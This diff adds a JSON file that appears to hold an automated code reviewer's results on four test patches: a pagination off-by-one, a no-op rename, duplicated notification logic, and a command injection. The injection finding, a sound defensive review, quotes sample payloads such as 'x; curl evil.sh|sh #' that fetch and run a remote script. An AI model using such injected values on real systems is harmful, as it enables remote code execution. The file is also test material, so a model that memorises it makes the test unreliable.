@@ -1,0 +1,111 @@
+{
+  "confirmation_reruns": [],
+  "invocations": [
+    {
+      "case_id": null,
+      "run": {
+        "cases": [
+          {
+            "id": "correctness-off-by-one-pagination",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "`page()` returns one extra item per page `end = offset + page_size + 1` makes the slice `items[offset:offset + page_size + 1]`, which is `page_size + 1` elements. Reading the code, `page([0..9], 1, 3)` gives `[0,1,2,3]` and `page([0..9], 2, 3)` gives `[3,4,5,6]`. Item 3 appears on both pages. The unchanged `offset = (page_number - 1) * page_size` shows the intended page width is `page_size`. Every page except possibly the last returns more items than requested and repeats the first item of the next page. Callers see duplicated rows and wrong page sizes, and any caller that assumes `len(result) <= page_size` breaks.",
+                "extra": {
+                  "defect_kind": "off-by-one",
+                  "evidence_quotes": [
+                    "end = offset + page_size + 1",
+                    "items[offset:offset + page_size + 1]",
+                    "page_size + 1",
+                    "page([0..9], 1, 3)",
+                    "[0,1,2,3]",
+                    "page([0..9], 2, 3)",
+                    "[3,4,5,6]",
+                    "offset = (page_number - 1) * page_size",
+                    "page_size"
+                  ]
+                },
+                "location": {
+                  "line": 3,
+                  "path": "app/pagination.py"
+                },
+                "severity": "P1"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "no-op-comment-and-rename",
+            "input_kind": "patch",
+            "produced_findings": [],
+            "status": "executed"
+          },
+          {
+            "id": "quality-duplicated-branch-logic",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Message-formatting step duplicated across the new `sms` branch The `sms` branch repeats the `email` branch's `msg = format_message(user)` line (`app/notify.py:3` and `:6`). The only difference between the branches is the sender call and the user attribute it reads (`send_email(user.email, \u2026)` and `send_sms(user.phone, \u2026)`). Each new channel will copy the formatting step again. If formatting changes, for example per-channel templates or length limits, every branch has to be edited in step, and a missed branch gives inconsistent messages. This is a maintainability cost only; current behavior is correct.",
+                "extra": {
+                  "defect_kind": "duplicated-logic",
+                  "evidence_quotes": [
+                    "sms",
+                    "email",
+                    "msg = format_message(user)",
+                    "app/notify.py:3",
+                    ":6",
+                    "send_email(user.email, \u2026)",
+                    "send_sms(user.phone, \u2026)"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 7,
+                    "start": 5
+                  },
+                  "path": "app/notify.py"
+                },
+                "severity": "P2"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "security-command-injection",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Shell command injection via `name` in `make_archive` `name` is interpolated unquoted into a command string that `/bin/sh` parses (`shell=True`). A value such as `x; curl evil.sh|sh #` or `$(id)` ends the `tar` command and runs the attacker's command, or substitutes its output. The previous list-form call passed `name` to `tar` as a single argv element, with no shell parsing. Nothing in the repository validates or sanitizes `name` (the only tracked file is `app/backup.py`), so the function must treat it as untrusted. Anyone who controls `name` can run arbitrary commands with the privileges of the process calling `make_archive`. That is remote code execution, with the confidentiality, integrity and availability consequences that follow. The change adds this exposure and gains nothing in return.",
+                "extra": {
+                  "defect_kind": "command-injection",
+                  "evidence_quotes": [
+                    "name",
+                    "/bin/sh",
+                    "shell=True",
+                    "x; curl evil.sh|sh #",
+                    "$(id)",
+                    "tar",
+                    "name",
+                    "tar",
+                    "name",
+                    "app/backup.py"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 6,
+                    "start": 5
+                  },
+                  "path": "app/backup.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    }
+  ]
+}
